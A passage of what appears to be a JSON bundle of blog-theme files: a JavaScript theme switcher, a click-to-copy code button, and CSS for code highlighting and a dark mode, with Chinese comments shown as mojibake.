a:nth-child(5)\").style.filter= 'grayscale(0%)'; document.querySelector(\"#start > aside > footer > div > a:nth-child(6)\").style.filter= 'grayscale(100%)'; } if (theme==='Moss'){document.querySelector(\"#start > aside > footer > div > a:nth-child(7)\").style.filter= 'grayscale(0%)';} else {document.querySelector(\"#start > aside > footer > div > a:nth-child(7)\").style.filter= 'grayscale(100%)';} window.localStorage.setItem('ZYI_Theme_Mode', theme); } /** * åˆå§‹åŒ–åšå®¢ä¸»é¢˜ */ switch (window.localStorage.getItem('ZYI_Theme_Mode')) { case 'light': ThemeChange('light'); break; case 'dark': ThemeChange('dark'); break; default: ThemeChange('Moss'); } /** * åˆ‡æ¢ä¸»é¢˜æ¨¡å¼ */ document.querySelector(\"#start > aside > footer > div > a:nth-child(5)\").onclick = () => { ThemeChange('dark'); } document.querySelector(\"#start > aside > footer > div > a:nth-child(6)\").onclick = () => { ThemeChange('light'); } document.querySelector(\"#start > aside > footer > div > a:nth-child(7)\").onclick = () => { ThemeChange('Moss'); }"},{"path":"/custom/js/copycode.js","content":"window.codeElements.forEach((codeElement) => { // åˆ›å»ºå¤åˆ¶æŒ‰é’® const codeCopyBtn = document.createElement('div'); codeCopyBtn.className = 'copy-btn'; codeCopyBtn.textContent = ctx.copycode.default_text; codeElement.appendChild(codeCopyBtn); // æ·»åŠ ç‚¹å‡»äº‹ä»¶ç›‘å¬ codeCopyBtn.addEventListener('click', async () => { const codeToCopy = codeElement.querySelector('pre')?.innerText || ''; if (navigator.clipboard) { try { await navigator.clipboard.writeText(codeToCopy); codeCopyBtn.textContent = ctx.copycode.success_text; codeCopyBtn.classList.add('success'); hud.toast(ctx.copycode.toast, 2500); } catch (error) { codeCopyBtn.textContent = 'æœªè·å¾—ç”¨æˆ·è®¸å¯'; codeCopyBtn.classList.add('warning'); } } else { codeCopyBtn.textContent = 'æµè§ˆå™¨ä¸æ”¯æŒ/éHTTPS'; codeCopyBtn.classList.add('warning'); } // 3ç§’åæ¢å¤é»˜è®¤æ–‡æœ¬ setTimeout(() => { codeCopyBtn.textContent = ctx.copycode.default_text; codeCopyBtn.classList.remove('success', 'warning'); }, 3000); }); });"},{"path":"/custom/css/ZYCode.css","content":":root{ --code-autor: 'Â© é’Ÿæ„åšå®¢ğŸŒ™'; --code-tip: \"ä¼˜é›…å€Ÿé‰´\"; } /*è¯­æ³•é«˜äº®*/ .hljs { position: relative; display: block; overflow-x: hidden; /*èƒŒæ™¯è·ŸéšStellar*/ background: var(--block); color: #9c67a1; padding: 30px 5px 2px 5px; box-shadow: 0 10px 30px 0px rgb(0 0 0 / 40%) } .hljs::before { content: var(--code-tip); position: absolute; left: 15px; top: 10px; overflow: visible; width: 12px; height: 12px; border-radius: 16px; box-shadow: 20px 0 #a9a6a1, 40px 0 #999; -webkit-box-shadow: 20px 0 #999, 40px 0 #999; background-color: #999; white-space: nowrap; text-indent: 75px; font-size: 16px; line-height: 12px; font-weight: 700; color: #999 } .highlight:hover .hljs::before { color: #35cd4b; box-shadow: 20px 0 #fdbc40, 40px 0 #35cd4b; -webkit-box-shadow: 20px 0 #fdbc40, 40px 0 #35cd4b; background-color: #fc625d; } .hljs-ln { display: inline-block; overflow-x: auto; padding-bottom: 5px } .hljs-ln td { padding: 0; background-color: var(--block) } .hljs-ln::-webkit-scrollbar { height: 10px; border-radius: 5px; background: #333; } .hljs-ln::-webkit-scrollbar-thumb { background-color: #bbb; border-radius: 5px; } .hljs-ln::-webkit-scrollbar-thumb:hover { background: #ddd; } .hljs table tbody tr { border: none } .hljs .hljs-ln-line { padding: 1px 10px; border: none } td.hljs-ln-line.hljs-ln-numbers { border-right: 1px solid #666; } .hljs-keyword, .hljs-literal, .hljs-symbol, .hljs-name { color: #c78300 } .hljs-link { color: #569cd6; text-decoration: underline } .hljs-built_in, .hljs-type { color: #4ec9b0 } .hljs-number, .hljs-class { color: #2094f3 } .hljs-string, .hljs-meta-string { color: #4caf50 } .hljs-regexp, .hljs-template-tag { color: #9a5334 } .hljs-subst, .hljs-function, .hljs-title, .hljs-params, .hljs-formula { color: #c78300 } .hljs-property { color: #9c67a1; } .hljs-comment, .hljs-quote { color: #57a64a; font-style: italic } .hljs-doctag { color: #608b4e } .hljs-meta, .hljs-meta-keyword, .hljs-tag { color: #9b9b9b } .hljs-variable, .hljs-template-variable { color: #bd63c5 } .hljs-attr, .hljs-attribute, .hljs-builtin-name { color: #d34141 } .hljs-section { color: gold } .hljs-emphasis { font-style: italic } .hljs-strong { font-weight: bold } .hljs-bullet, .hljs-selector-tag, .hljs-selector-id, .hljs-selector-class, .hljs-selector-attr, .hljs-selector-pseudo { color: #c78300 } .hljs-addition { background-color: #144212; display: inline-block; width: 100% } .hljs-deletion { background-color: #600; display: inline-block; width: 100% } .hljs.language-html::before, .hljs.language-xml::before { content: \"HTML/XML\" } .hljs.language-javascript::before { content: \"JavaScript\" } .hljs.language-c::before { content: \"C\" } .hljs.language-cpp::before { content: \"C++\" } .hljs.language-java::before { content: \"Java\" } .hljs.language-asp::before { content: \"ASP\" } .hljs.language-actionscript::before { content: \"ActionScript/Flash/Flex\" } .hljs.language-bash::before { content: \"Bash\" } .hljs.language-css::before { content: \"CSS\" } .hljs.language-asp::before { content: \"ASP\" } .hljs.language-cs::before, .hljs.language-csharp::before { content: \"C#\" } .hljs.language-d::before { content: \"D\" } .hljs.language-golang::before, .hljs.language-go::before { content: \"Go\" } .hljs.language-json::before { content: \"JSON\" } .hljs.language-lua::before { content: \"Lua\" } .hljs.language-less::before { content: \"LESS\" } .hljs.language-md::before, .hljs.language-markdown::before, .hljs.language-mkdown::before, .hljs.language-mkd::before { content: \"Markdown\" } .hljs.language-mm::before, .hljs.language-objc::before, .hljs.language-obj-c::before, .hljs.language-objective-c::before { content: \"Objective-C\" } .hljs.language-php::before { content: \"PHP\" } .hljs.language-perl::before, .hljs.language-pl::before, .hljs.language-pm::before { content: \"Perl\" } .hljs.language-python::before, .hljs.language-py::before, .hljs.language-gyp::before, .hljs.language-ipython::before { content: \"Python\" } .hljs.language-r::before { content: \"R\" } .hljs.language-ruby::before, .hljs.language-rb::before, .hljs.language-gemspec::before, .hljs.language-podspec::before, .hljs.language-thor::before, .hljs.language-irb::before { content: \"Ruby\" } .hljs.language-sql::before { content: \"SQL\" } .hljs.language-sh::before, .hljs.language-shell::before, .hljs.language-Session::before, .hljs.language-shellsession::before, .hljs.language-console::before { content: \"Shell\" } .hljs.language-swift::before { content: \"Swift\" } .hljs.language-vb::before { content: \"VB/VBScript\" } .hljs.language-yaml::before { content: \"YAML\" } /*stellarä¸»é¢˜è¡¥å¿*/ .md-text pre>.hljs { padding-top: 2rem !important; } .md-text pre { padding: 0 !important; } code { background-image: linear-gradient(90deg, rgba(60, 10, 30, .04) 3%, transparent 0), linear-gradient(1turn, rgba(60, 10, 30, .04) 3%, transparent 0) !important; background-size: 20px 20px !important; background-position: 50% !important; } figure::after { content: var(--code-autor); text-align: right; font-size: 10px; float: right; margin-top: 3px; padding-right: 15px; padding-bottom: 8px; color: #999 } figcaption span { border-radius: 0px 0px 12px 12px !important; } /* å¤åˆ¶ä»£ç æŒ‰é’® */ .highlight { position: relative; } .highlight .code .copy-btn { position: absolute; top: 0; right: 0; padding: 4px 0.5rem; opacity: 0.25; font-weight: 700; color: var(--theme); cursor: pointer; transination: opacity 0.3s; } .highlight .code .copy-btn:hover { color: var(--text-code); opacity: 0.75; } .highlight .code .copy-btn.success { color: var(--swiper-theme-color); opacity: 0.75; } /* æè¿° */ .md-text .highlight figcaption span { font-size: small; } /* æŠ˜å  */ code.hljs { display: -webkit-box; overflow: hidden; text-overflow: ellipsis; -webkit-box-orient: vertical; /*-webkit-line-clamp: 6;*/ padding: 1rem 1rem 0 1rem; /* chinoå»ºè®® */ } .hljsOpen { -webkit-line-clamp: 99999 !important; } .CodeCloseDiv { color: #999; background: var(--block); display: flex; justify-content: center; margin-top: inherit; margin-bottom: -18px; } .CodeClose { color: #999; margin-top: 3px; background: var(--block); } .highlight button:hover, .highlight table:hover+button { color: var(--swiper-theme-color); opacity: 0.75; }"},{"path":"/custom/css/ZYDark.css","content":"#ZYDark:root { --site-bg: #1c1e21; --card: #373d43; --block: #26292c; --block-border: #383d42; --block-hover: #2f3337; --text-p0: #fff; --text-p1: #ccc; --text-p2: #b3b3b3; --text-p3: #858585; --text-p4: #707070; --text-meta: #4d4d4d; --text-code: #ff6333; } @media screen and (max-width: 667px) { #ZYDark:root { --site-bg: #000; } } #ZYDark:root { --blur-bg: rgba(0,0,0,0.5); } #ZYDark .float-panel { --blur-bg: rgba(0,0,0,0.4); } #ZYDark .tag-plugin.tag { --theme: #ff6333; --theme-bg1: #3d1e14; --theme-bg2: #2f2522; --theme-border: #5c2d1f; --text-p0: #ffc4b3; --text-p1: #dfae9f; --text-p2: #f1997e; } #ZYDark .tag-plugin[color='red'] { --theme: #f44336; --theme-bg1: #3d1714; --theme-bg2: #2f2322; --theme-border: #5c231f; --text-p0: #ffb8b3; --text-p1: #dfa49f; --text-p2: #f1867e; } #ZYDark .tag-plugin[color='orange'] { --theme: #fa6400; --theme-bg1: #3d2514; --theme-bg2: #2f2722; --theme-border: #5c371f; --text-p0: #ffd1b3; --text-p1: #dfb99f; --text-p2: #f1ac7e; } #ZYDark .tag-plugin[color='yellow'] { --theme: #ffbd2b; --theme-bg1: #3d3014; --theme-bg2: #2f2b22; --theme-border: #5c491f; --text-p0: #ffe7b3; --text-p1: #dfcb9f; --text-p2: #f1cd7e; } #ZYDark .tag-plugin[color='green'] { --theme: #3dc550; --theme-bg1: #143d1a; --theme-bg2: #222f24; --theme-border: #1f5c27; --text-p0: #b3ffbd; --text-p1: #9fdfa8; --text-p2: #7ef18e; } #ZYDark .tag-plugin[color='cyan'] { --theme: #1bcdfc; --theme-bg1: #14353d; --theme-bg2: #222d2f; --theme-border: #1f4f5c; --text-p0: #b3efff; --text-p1: #9fd2df; --text-p2: #7ed9f1; } #ZYDark .tag-plugin[color='blue'] { --theme: #2196f3; --theme-bg1: #142b3d; --theme-bg2: #222a2f; --theme-border: #1f415c; --text-p0: #b3ddff; --text-p1: #9fc3df; --text-p2: #7ebef1; } #ZYDark .tag-plugin[color='purple'] { --theme: #9c27b0; --theme-bg1: #37143d; --theme-bg2: #2d222f; --theme-border: #531f5c; --text-p0: #f4b3ff; --text-p1: #d69fdf; --text-p2: #e07ef1; } #ZYDark .tag-plugin[color='light'] { --theme-border: #fff; --theme-bg1: #e0e0e0; --theme-bg2: #fff; --text-p0: #000; --text-p1: #111; --text-p2: #1f1f1f; --text-p3: #555; --text-code: #fff; } #ZYDark .tag-plugin[color='dark'] { --theme-border: #000; --theme-bg1: #1f1f1f; --theme-bg2: #111; --text-p0: #fff; --text-p1: #fff; --text-p2: #e0e0e0; --text-p3: #ddd; --text-code: #fff; } #ZYDark .tag-plugin[color='warning'], #ZYDark .tag-plugin[color='light'] { --text-p0: #000; --text-p1: #111; --text-p2: #1f1f1f; --text-p3: #555; --text-code: #fff; } #ZYDark .social-wrap a.social:hover { box-shadow: none; } /* walineè¯„è®ºæ ·å¼ */ #ZYDark .wl-count{ padding: .375em; font-weight: bold; font-size: 1.25em; color: #fff; } #ZYDark .cmt-body.waline{ --waline-white: #000; --waline-light-grey: #666; --waline-dark-grey: #999; /* å¸ƒå±€é¢œè‰² */ --waline-color: #fff; --waline-bgcolor: var(--block); --waline-bgcolor-light: #272727; --waline-border-color: #333; --waline-disable-bgcolor: #444; --waline-disable-color: #272727; /* ç‰¹æ®Šé¢œè‰² */ --waline-bq-color: #272727; /* å…¶ä»–é¢œè‰² */ --waline-info-bgcolor: #272727; --waline-info-color: #666; }"}]